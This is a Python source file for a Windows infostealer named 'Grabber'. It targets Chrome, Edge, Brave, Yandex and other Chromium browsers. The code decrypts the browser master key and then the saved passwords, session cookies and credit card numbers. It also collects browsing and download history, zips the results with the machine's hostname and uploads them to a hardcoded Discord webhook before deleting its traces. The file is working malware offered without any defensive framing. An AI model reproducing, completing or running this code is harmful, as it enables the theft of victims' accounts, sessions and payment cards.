import os
import json
import base64
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import shutil
from datetime import datetime
import threading
from zipfile import ZipFile
import requests
import socket

APPDATA = os.getenv('LOCALAPPDATA')

browsers = {
    'amigo': APPDATA + '\\Amigo\\User Data',
    'torch': APPDATA + '\\Torch\\User Data',
    'kometa': APPDATA + '\\Kometa\\User Data',
    'orbitum': APPDATA + '\\Orbitum\\User Data',
    'cent-browser': APPDATA + '\\CentBrowser\\User Data',
    '7star': APPDATA + '\\7Star\\7Star\\User Data',
    'sputnik': APPDATA + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': APPDATA + '\\Vivaldi\\User Data',
    'googlechromesxs': APPDATA + '\\Google\\Chrome SxS\\User Data',
    'googlechrome': APPDATA + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': APPDATA + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': APPDATA + '\\Microsoft\\Edge\\User Data',
    'uran': APPDATA + '\\uCozMedia\\Uran\\User Data',
    'yandex': APPDATA + '\\Yandex\\YandexBrowser\\User Data',
    'brave': APPDATA + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': APPDATA + '\\Iridium\\User Data',
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def save_results(browser_name, data_type, content):
    if not os.path.exists(browser_name):
        os.makedirs("Grabbed/", exist_ok=True)
        os.makedirs(f"Grabbed/{browser_name}", exist_ok=True)
    if content is not None:
        try:
            open(f'Grabbed/{browser_name}/{data_type}.txt', 'w').write(content)
        except:
            pass


def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, 'login_db')
    conn = sqlite3.connect('login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
URL: {row[0]}
Email: {row[1]}
Password: {password}
______________________         
        """
    conn.close()
    os.remove('login_db')
    return result


def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, 'cards_db')
    conn = sqlite3.connect('cards_db')
    cursor = conn.cursor()
    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
Name On Card: {row[0]}
Card Number: {card_number}
Expires On:  {row[1]} / {row[2]}
Added On: {datetime.fromtimestamp(row[4])}
______________________         
        """

    conn.close()
    os.remove('cards_db')
    return result


def get_cookies(path: str, profile: str, master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, 'cookie_db')
    conn = sqlite3.connect('cookie_db')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
Host : {row[0]}
Cookie Name : {row[1]}
Cookie: {cookie}
______________________        
        """

    conn.close()
    os.remove('cookie_db')
    return result


def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, 'web_history_db')
    conn = sqlite3.connect('web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
URL: {row[0]}
Title: {row[1]}
Visited Time: {row[2]}
______________________         
        """
    conn.close()
    os.remove('web_history_db')
    return result


def get_downloads(path: str, profile: str):
    downloads_db = f'{path}\\{profile}\\History'
    if not os.path.exists(downloads_db):
        return
    result = ""
    shutil.copy(downloads_db, 'downloads_db')
    conn = sqlite3.connect('downloads_db')
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result += f"""
Download URL: {row[0]}
Local Path: {row[1]}
______________________     
        """

    conn.close()
    os.remove('downloads_db')


def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def send():
    data = {
        "content" : "||@everyone|| ",
        "username": 'Grabber'
    }

    data["embeds"] = [
        {
            "title" : "Info",
            "color": 16711680,
            "description": f"**Grabbed From :** `{socket.gethostname()}`"
        }
    ]

    with ZipFile(f"Grabbed.zip", "w") as zf:
        for folder in os.listdir("Grabbed"):
            if not ".zip" in folder: 
                zf.write("Grabbed" + "/" + folder)
            for file in os.listdir("Grabbed/"+folder):
                zf.write(f"Grabbed/{folder}" + "/" + file)
                
    with open("Grabbed.zip", 'rb') as f:
        threading.Thread(target=requests.post("https://discord.com/api/webhooks/1056230911517139035/w_uFOGLkE1TnBBM3eypfrgfeY8DW4SSOt6gnhRrJprXuwTimZQYWRTvbrT1oKdTpE2Vh", json=data))
        threading.Thread(target=requests.post("https://discord.com/api/webhooks/1056230911517139035/w_uFOGLkE1TnBBM3eypfrgfeY8DW4SSOt6gnhRrJprXuwTimZQYWRTvbrT1oKdTpE2Vh",files={'file': f}))
        
    os.remove("Grabbed.zip")
    shutil.rmtree('Grabbed/')


def Init():
    if os.name != 'nt':
        exit()
    for browser in installed_browsers():
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        threading.Thread(target = save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))).start()
        threading.Thread(target = save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))).start()
        threading.Thread(target = save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))).start()
        threading.Thread(target = save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))).start()
        threading.Thread(target = save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))).start()
    threading.Thread(target= send).start()